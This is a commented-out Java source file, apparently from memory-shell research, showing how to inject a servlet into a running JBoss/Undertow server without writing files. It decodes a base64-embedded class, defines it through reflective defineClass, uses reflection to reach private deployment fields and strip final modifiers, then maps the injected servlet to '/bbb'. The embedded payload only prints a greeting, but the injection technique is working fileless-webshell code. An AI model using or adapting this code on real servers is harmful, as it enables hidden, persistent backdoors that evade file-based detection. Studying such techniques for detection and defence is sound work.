//package com.memshell.jboss;
//
//import io.undertow.servlet.api.DeploymentInfo;
//import io.undertow.servlet.api.ServletInfo;
//import io.undertow.servlet.core.DeploymentImpl;
//import io.undertow.servlet.handlers.ServletHandler;
//import io.undertow.servlet.spec.HttpServletRequestImpl;
//import io.undertow.servlet.spec.ServletRegistrationImpl;
//import io.undertow.servlet.util.ConstructorInstanceFactory;
//import sun.misc.BASE64Decoder;
//
//import javax.security.jacc.PolicyContext;
//import javax.servlet.Servlet;
//import javax.servlet.ServletContext;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import java.lang.reflect.Modifier;
//import java.util.Map;
//
//public class ServletBasedWithoutRequest extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        // 参考：
//        // 《Dynamic Servlet Registration》 http://www.mastertheboss.com/javaee/servlet-30/dynamic-servlet-registration
//        // 《JBOSS 无文件webshell的技术研究》 https://mp.weixin.qq.com/s/_SQS9B7tkL1H5fMIgPTOKw
//
//        try{
//            String className = "com.memshell.generic.DynamicServletTemplate";
//            Class clazz = null;
//            try {
//                clazz = Class.forName(className);
//            } catch (ClassNotFoundException e) {
//                BASE64Decoder base64Decoder = new BASE64Decoder();
//                String codeStr = "yv66vgAAADQAJAoABgAWCQAXABgIABkKABoAGwcAHAcAHQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAtTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNTZXJ2bGV0VGVtcGxhdGU7AQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAApTb3VyY2VGaWxlAQAbRHluYW1pY1NlcnZsZXRUZW1wbGF0ZS5qYXZhDAAHAAgHAB4MAB8AIAEAKkknbSBTZXJ2bGV0IEJhc2VkIE1lbXNoZWxsLCBob3cgZG8geW91IGRvPwcAIQwAIgAjAQArY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY1NlcnZsZXRUZW1wbGF0ZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAgABAAcACAABAAkAAAAvAAEAAQAAAAUqtwABsQAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAABAAOAA8AAQAJAAAASwACAAMAAAAJsgACEgO2AASxAAAAAgAKAAAACgACAAAADQAIAA4ACwAAACAAAwAAAAkADAANAAAAAAAJABAAEQABAAAACQASABMAAgABABQAAAACABU=";
//                Method defineClassMethod = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                defineClassMethod.setAccessible(true);
//                clazz = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), base64Decoder.decodeBuffer(codeStr), 0, base64Decoder.decodeBuffer(codeStr).length);
//            }
//
////            public ServletRegistration.Dynamic addServlet(final String servletName, final Servlet servlet) {
////                ensureNotProgramaticListener();
////                ensureNotInitialized();
////                ensureServletNameNotNull(servletName);
////                if (deploymentInfo.getServlets().containsKey(servletName)) {
////                    return null;
////                }
////                ServletInfo s = new ServletInfo(servletName, servlet.getClass(), new ImmediateInstanceFactory<>(servlet));
////                readServletAnnotations(s);
////                deploymentInfo.addServlet(s);
////                ServletHandler handler = deployment.getServlets().addServlet(s);
////                return new ServletRegistrationImpl(s, handler.getManagedServlet(), deployment);
////            }
//
//            ServletInfo servletInfo = new ServletInfo("dynamicServlet", clazz, new ConstructorInstanceFactory<Servlet>(clazz.getDeclaredConstructor()));
//            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
//            ServletContext context = request.getServletContext();
//            Field f = context.getClass().getDeclaredField("deploymentInfo");
//            f.setAccessible(true);
//            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);
//
//            //只添加一次
//            Map<String, ServletInfo> servlets = deploymentInfo.getServlets();
//            if(!servlets.containsKey("dynamicServlet")){
//                System.out.println("Add Dynamic Servlet...");
//                deploymentInfo.addServlet(servletInfo);
//
//                f = context.getClass().getDeclaredField("deployment");
//                f.setAccessible(true);
//                Field modifiersField = Field.class.getDeclaredField("modifiers");
//                modifiersField.setAccessible(true);
//                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
//                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
//                ServletHandler handler = deployment.getServlets().addServlet(servletInfo);
//
//                ServletRegistrationImpl registration =  new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
//                registration.addMapping("/bbb");
//            }
//        }catch(Exception e){
//            e.printStackTrace();
//        }
//
//        System.out.println("Done");
//    }
//}
